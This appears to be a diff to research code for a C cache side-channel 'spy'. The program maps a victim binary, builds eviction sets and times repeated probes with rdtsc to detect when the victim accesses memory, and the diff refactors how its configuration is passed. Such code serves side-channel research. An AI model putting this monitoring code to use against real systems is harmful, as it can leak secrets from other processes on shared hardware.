@@ -33,7 +33,7 @@ void *map(char *file_name, uint64_t offset)
 }
 
 
-void init_spy(char *target_filepath, int offset_target){
+void init_spy(Config *spy_conf, char *target_filepath, int offset_target){
     printf("[+] spy: init spy\n");
     // load victim addresses
     victim = map(target_filepath, offset_target);
@@ -41,12 +41,8 @@ void init_spy(char *target_filepath, int offset_target){
     // printf("victim read\n");
 
     // prepare evset
-    Config *spy_conf= config_init(27, 2048, 64, 106, 2097152, 1, 1);
-    init_evset(spy_conf);
-    printf("[+] spy: init evset done\n");
     spy_evsets = find_evset(spy_conf, victim);
-    printf("[+] spy: find evset done\n");
-    
+    printf("[+] spy: find evset done\n");    
     printf("[+] spy: print spy evset for target adrs %p\n", victim);
     list_print(spy_evsets);
 
@@ -60,21 +56,21 @@ static __inline__ unsigned long long rdtsc(void)
     return x;
 }
 
-void my_monitor(){
+void my_monitor(Config *spy_conf){
     int ctr =0, evset_probetime;
     unsigned long long old_tsc, tsc = rdtsc();
-    probe_chase_loop(victim_copy, 1);
-    probe_chase_loop(victim, 1);
-    probe_evset_chase(*spy_evsets);
-    probe_evset_chase(*spy_evsets);
+    probe_evset_single(victim_copy);
+    probe_evset_single(victim);
+    probe_evset_chase(spy_conf, *spy_evsets);
+    probe_evset_chase(spy_conf, *spy_evsets);
     // void *my_victim = map("./build/victim", 0x11a8);
 
 
-    int timing1 = probe_chase_loop(victim, 1);
-    int timing2 = probe_chase_loop(victim, 1);
-    probe_evset_chase(*spy_evsets);
-    int timing3 = probe_chase_loop(victim_copy, 1);
-    int timing4 = probe_chase_loop(victim, 1);
+    int timing1 = probe_evset_single(victim);
+    int timing2 = probe_evset_single(victim);
+    probe_evset_chase(spy_conf, *spy_evsets);
+    int timing3 = probe_evset_single(victim_copy);
+    int timing4 = probe_evset_single(victim);
 
     printf("%d %d %d %d\n", timing1, timing2, timing3, timing4);
     while(1)
@@ -85,10 +81,10 @@ void my_monitor(){
         {
             tsc = rdtsc();
         }
-        msrmts_spy[ctr]= probe_chase_loop(victim, 1);
-        probe_evset_chase(*spy_evsets);
-        evset_probetime = probe_evset_chase(*spy_evsets);
-        if(msrmts_spy[ctr] < conf->threshold) {
+        msrmts_spy[ctr]= probe_evset_single(victim);
+        probe_evset_chase(spy_conf, *spy_evsets);
+        evset_probetime = probe_evset_chase(spy_conf, *spy_evsets);
+        if(msrmts_spy[ctr] < spy_conf->threshold) {
             printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d, evset_probetime %lu\n", msrmts_spy[ctr], ctr, evset_probetime);
         }
         ctr++;
@@ -100,9 +96,10 @@ void my_monitor(){
 }
 
 void spy(char *victim_filepath, int offset_target){
-    init_spy(victim_filepath, offset_target);
+    Config *spy_conf= config_init(27, 2048, 64, 106, 2097152);
+    init_spy(spy_conf, victim_filepath, offset_target);
     printf("[+] spy: spy init complete, monitoring %p now...\n", victim);
-    my_monitor();
+    my_monitor(spy_conf);
 }
 
 int main(int ac, char **av){  
